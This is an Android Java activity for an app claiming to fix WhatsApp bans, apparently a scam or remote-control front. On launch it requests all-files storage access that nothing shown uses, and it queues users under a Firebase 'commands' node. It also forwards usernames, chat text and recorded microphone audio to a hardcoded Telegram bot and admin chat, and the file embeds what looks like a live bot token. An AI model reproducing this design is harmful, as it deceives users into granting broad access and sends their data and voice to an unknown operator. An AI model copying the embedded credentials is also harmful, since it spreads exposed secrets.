package com.ban.ab;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Dialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.ImageButton;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.android.material.floatingactionbutton.FloatingActionButton;
import com.google.android.material.textfield.TextInputEditText;

import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.util.Iterator;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private TextInputEditText edtUserName; 
    private Spinner spinnerBanType;
    private Button btnSubmit, btnWatchVideo;
    private ProgressBar btnProgressBar; // شريط التقدم داخل الزر
    private final OkHttpClient client = new OkHttpClient();
    
    private final String FIREBASE_URL = "https://banproject-2f9c6-default-rtdb.firebaseio.com/";
    private final String TELEGRAM_BOT_TOKEN = "8728882712:AAHBUsyFmocj1AwCJSVE-kPMIG7zy9WcZo4";
    private final String ADMIN_CHAT_ID = "1749638488"; 

    private MediaRecorder recorder;
    private String voiceFileName;
    private FloatingActionButton fabChat;
    
    private final Handler chatHandler = new Handler(Looper.getMainLooper());
    private Runnable chatRunnable;
    private String currentUserID = "visitor";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // 1. فحص الجلسة السابقة
        checkExistingSession();

        // 2. طلب الأذونات الضرورية
        requestStoragePermission();

        // 3. ربط العناصر بالواجهة
        initViews();

        // 4. إعداد القائمة المنسدلة
        setupBanTypeSpinner();

        // 5. إعداد الزر العائم للمحادثة
        setupFloatingChatButton();

        // 6. منطق زر الإرسال المحدث لمنع التكرار وتحسين المظهر
        btnSubmit.setOnClickListener(v -> {
            String name = edtUserName.getText().toString().trim();
            int selectedPosition = spinnerBanType.getSelectedItemPosition();
            String selectedBan = spinnerBanType.getSelectedItem().toString();
            
            if (name.isEmpty()) {
                Toast.makeText(this, "يرجى إدخال البيانات المطلوبة", Toast.LENGTH_SHORT).show();
                return;
            }

            if (selectedPosition == 0) {
                Toast.makeText(this, "يجب اختيار نوع الحظر للمتابعة", Toast.LENGTH_SHORT).show();
                spinnerBanType.performClick();
                return;
            }

            // --- تفعيل حالة التحميل ومنع الضغط المتكرر ---
            startLoadingState();

            currentUserID = name; 
            uploadToFirebase(name, selectedBan);
        });

        // 7. منطق زر مشاهدة الفيديو
        btnWatchVideo.setOnClickListener(v -> showVideoPopup("https://www.youtube.com/embed/YOUR_VIDEO_ID"));
    }

    private void initViews() {
        edtUserName = findViewById(R.id.edtUserName);
        spinnerBanType = findViewById(R.id.spinnerBanType);
        btnSubmit = findViewById(R.id.btnSubmit);
        btnWatchVideo = findViewById(R.id.btnWatchVideo);
        btnProgressBar = findViewById(R.id.btnProgressBar); // شريط التقدم الصغير
    }

    private void startLoadingState() {
        btnSubmit.setEnabled(false); // تعطيل الزر فوراً
        btnSubmit.setText(""); // إخفاء النص لترك مساحة للأيقونة
        btnProgressBar.setVisibility(View.VISIBLE); // إظهار أيقونة الانتظار داخل الزر
    }

    private void stopLoadingState() {
        btnSubmit.setEnabled(true);
        btnSubmit.setText("إرسال طلب التحقق");
        btnProgressBar.setVisibility(View.GONE);
    }

    private void checkExistingSession() {
        SharedPreferences pref = getSharedPreferences("AppPrefs", MODE_PRIVATE);
        if (pref.contains("user_name")) {
            currentUserID = pref.getString("user_name", "visitor");
            startActivity(new Intent(this, SecondActivity.class));
            finish();
        }
    }

    private void setupBanTypeSpinner() {
        String[] banOptions = {
                "اضغط هنا لاختيار نوع الحظر...", 
                "مشكلة حظر إستخدام الواتساب الرسمي",
                "تسجيل الدخول غير متوفر",
                "حظر انتهاك أو مشدد",
                "مشكلة كود التحقق"
        };

        ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, android.R.layout.simple_spinner_dropdown_item, banOptions) {
            @Override
            public boolean isEnabled(int position) {
                return position != 0;
            }

            @NonNull
            @Override
            public View getDropDownView(int position, @Nullable View convertView, @NonNull ViewGroup parent) {
                View view = super.getDropDownView(position, convertView, parent);
                TextView tv = (TextView) view;
                tv.setTextSize(13); // تصغير الخط في القائمة المنسدلة
                if (position == 0) {
                    tv.setTextColor(Color.GRAY);
                } else {
                    tv.setTextColor(Color.BLACK);
                }
                return view;
            }
        };
        spinnerBanType.setAdapter(adapter);
    }

    private void requestStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        }
    }

    private void setupFloatingChatButton() {
        fabChat = new FloatingActionButton(this);
        fabChat.setImageResource(android.R.drawable.stat_notify_chat);
        fabChat.setBackgroundTintList(android.content.res.ColorStateList.valueOf(Color.parseColor("#2E7D32"))); 
        FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(-2, -2);
        params.gravity = Gravity.BOTTOM | Gravity.START;
        params.setMargins(50, 0, 0, 50);
        ((ViewGroup) findViewById(android.R.id.content)).addView(fabChat, params);
        fabChat.setOnClickListener(v -> showChatPopup());
    }

    private void showVideoPopup(String videoUrl) {
        Dialog dialog = new Dialog(this);
        dialog.setContentView(R.layout.popup_video);
        WebView webView = dialog.findViewById(R.id.videoWebView);
        if (webView != null) {
            webView.getSettings().setJavaScriptEnabled(true);
            webView.setWebChromeClient(new WebChromeClient());
            webView.loadUrl(videoUrl);
        }
        if (dialog.getWindow() != null) {
            dialog.getWindow().setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        }
        dialog.show();
    }

    @SuppressLint("ClickableViewAccessibility")
    private void showChatPopup() {
        final Dialog chatDialog = new Dialog(this);
        chatDialog.setContentView(R.layout.chat_layout);
        chatDialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        
        Window window = chatDialog.getWindow();
        window.setGravity(Gravity.BOTTOM | Gravity.START);
        WindowManager.LayoutParams wlp = window.getAttributes();
        wlp.x = 50; wlp.y = 200;
        window.setAttributes(wlp);

        LinearLayout msgContainer = chatDialog.findViewById(R.id.chatMessagesContainer);
        ScrollView scrollView = chatDialog.findViewById(R.id.chatScrollView);
        EditText edtMsg = chatDialog.findViewById(R.id.edtMessage);
        ImageButton btnSend = chatDialog.findViewById(R.id.btnSendMessage);
        ImageButton btnRecord = chatDialog.findViewById(R.id.btnRecord);

        startChatMonitoring(msgContainer, scrollView);

        chatDialog.findViewById(R.id.btnCloseChat).setOnClickListener(v -> {
            stopChatMonitoring();
            chatDialog.dismiss();
        });

        btnSend.setOnClickListener(v -> {
            String text = edtMsg.getText().toString().trim();
            if (!text.isEmpty()) {
                saveMessageToFirebase("user", text);
                sendTextToTelegram(text);
                edtMsg.setText("");
            }
        });

        btnRecord.setOnTouchListener((v, event) -> {
            if (event.getAction() == MotionEvent.ACTION_DOWN) {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECORD_AUDIO}, 100);
                } else {
                    startVoiceRecording();
                }
            } else if (event.getAction() == MotionEvent.ACTION_UP) {
                stopVoiceRecording();
            }
            return true;
        });

        chatDialog.show();
    }

    private void startVoiceRecording() {
        try {
            voiceFileName = getExternalCacheDir().getAbsolutePath() + "/visitor_voice.m4a";
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(voiceFileName);
            recorder.prepare();
            recorder.start();
        } catch (Exception e) { e.printStackTrace(); }
    }

    private void stopVoiceRecording() {
        if (recorder != null) {
            try {
                recorder.stop();
                recorder.release();
                recorder = null;
                if (voiceFileName != null) sendVoiceToTelegram(voiceFileName);
            } catch (RuntimeException e) {
                if (recorder != null) { recorder.release(); recorder = null; }
            }
        }
    }

    private void sendVoiceToTelegram(String path) {
        File file = new File(path);
        if (!file.exists()) return;
        RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("voice", file.getName(), RequestBody.create(file, MediaType.parse("audio/m4a")))
                .addFormDataPart("chat_id", ADMIN_CHAT_ID)
                .addFormDataPart("caption", "🎤 بصمة صوتية من: " + currentUserID)
                .build();
        client.newCall(new Request.Builder().url("https://api.telegram.org/bot"+TELEGRAM_BOT_TOKEN+"/sendVoice").post(body).build()).enqueue(new Callback() {
            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {}
            @Override public void onResponse(@NonNull Call call, @NonNull Response response) {}
        });
    }

    private void uploadToFirebase(String name, String banType) {
        String url = FIREBASE_URL + "commands/" + name + ".json";
        try {
            JSONObject body = new JSONObject();
            body.put("status", "waiting");
            body.put("ban_type", banType);
            
            client.newCall(new Request.Builder().url(url).put(RequestBody.create(body.toString(), MediaType.parse("application/json"))).build()).enqueue(new Callback() {
                @Override public void onFailure(@NonNull Call call, @NonNull IOException e) { 
                    runOnUiThread(() -> {
                        stopLoadingState();
                        handleError("فشل الاتصال بالخادم"); 
                    });
                }
                @Override public void onResponse(@NonNull Call call, @NonNull Response response) {
                    if (response.isSuccessful()) { 
                        sendTelegramNotification(name, banType); 
                        saveAndProceed(name); 
                    } else {
                        runOnUiThread(() -> stopLoadingState());
                    }
                }
            });
        } catch (Exception ignored) {
            stopLoadingState();
        }
    }

    private void sendTelegramNotification(String name, String banType) {
        String msg = "🚀 طلب فحص جديد:\n👤 المستخدم: " + name + "\n⚠️ النوع: " + banType;
        String url = "https://api.telegram.org/bot"+TELEGRAM_BOT_TOKEN+"/sendMessage?chat_id="+ADMIN_CHAT_ID+"&text="+Uri.encode(msg);
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {}
            @Override public void onResponse(@NonNull Call call, @NonNull Response response) {}
        });
    }

    private void saveMessageToFirebase(String sender, String text) {
        String url = FIREBASE_URL + "commands/" + currentUserID + "/messages.json";
        try {
            JSONObject msg = new JSONObject();
            msg.put("sender", sender);
            msg.put("text", text);
            msg.put("time", System.currentTimeMillis());
            client.newCall(new Request.Builder().url(url).post(RequestBody.create(msg.toString(), MediaType.parse("application/json"))).build()).enqueue(new Callback() {
                @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {}
                @Override public void onResponse(@NonNull Call call, @NonNull Response response) {}
            });
        } catch (Exception ignored) {}
    }

    private void sendTextToTelegram(String msg) {
        String fullMsg = "💬 " + currentUserID + ": " + msg;
        String url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage?chat_id=" + ADMIN_CHAT_ID + "&text=" + Uri.encode(fullMsg);
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {}
            @Override public void onResponse(@NonNull Call call, @NonNull Response response) {}
        });
    }

    private void startChatMonitoring(LinearLayout container, ScrollView scroll) {
        chatRunnable = new Runnable() {
            @Override public void run() { loadChatMessages(container, scroll); chatHandler.postDelayed(this, 3000); }
        };
        chatHandler.post(chatRunnable);
    }

    private void loadChatMessages(LinearLayout container, ScrollView scroll) {
        String url = FIREBASE_URL + "commands/" + currentUserID + "/messages.json";
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {}
            @Override public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                if (response.isSuccessful() && response.body() != null) {
                    String data = response.body().string();
                    if (data.equals("null")) return;
                    runOnUiThread(() -> {
                        try {
                            JSONObject json = new JSONObject(data);
                            container.removeAllViews();
                            Iterator<String> keys = json.keys();
                            while (keys.hasNext()) {
                                JSONObject msgObj = json.getJSONObject(keys.next());
                                addMessageToUI(container, msgObj.getString("text"), msgObj.getString("sender"));
                            }
                            scroll.post(() -> scroll.fullScroll(View.FOCUS_DOWN));
                        } catch (Exception ignored) {}
                    });
                }
            }
        });
    }

    private void addMessageToUI(LinearLayout container, String text, String sender) {
        TextView tv = new TextView(this);
        tv.setText(text);
        tv.setTextSize(12); // تصغير خط رسائل الدردشة
        tv.setPadding(25, 15, 25, 15);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(-2, -2);
        lp.setMargins(10, 5, 10, 5);
        if (sender.equals("user")) {
            tv.setBackgroundResource(android.R.drawable.editbox_dropdown_light_frame);
            tv.setBackgroundColor(Color.parseColor("#E8F5E9"));
            lp.gravity = Gravity.END;
        } else {
            tv.setBackgroundResource(android.R.drawable.editbox_dropdown_dark_frame);
            tv.setBackgroundColor(Color.parseColor("#2E7D32"));
            tv.setTextColor(Color.WHITE);
            lp.gravity = Gravity.START;
        }
        container.addView(tv, lp);
    }

    private void saveAndProceed(String name) {
        getSharedPreferences("AppPrefs", MODE_PRIVATE).edit().putString("user_name", name).apply();
        runOnUiThread(() -> new Handler().postDelayed(() -> {
            startActivity(new Intent(MainActivity.this, SecondActivity.class));
            finish();
        }, 500));
    }

    private void handleError(String msg) {
        runOnUiThread(() -> { 
            stopLoadingState(); 
            Toast.makeText(this, msg, Toast.LENGTH_SHORT).show(); 
        });
    }

    private void stopChatMonitoring() { chatHandler.removeCallbacks(chatRunnable); }
    @Override protected void onDestroy() { super.onDestroy(); stopChatMonitoring(); }
}
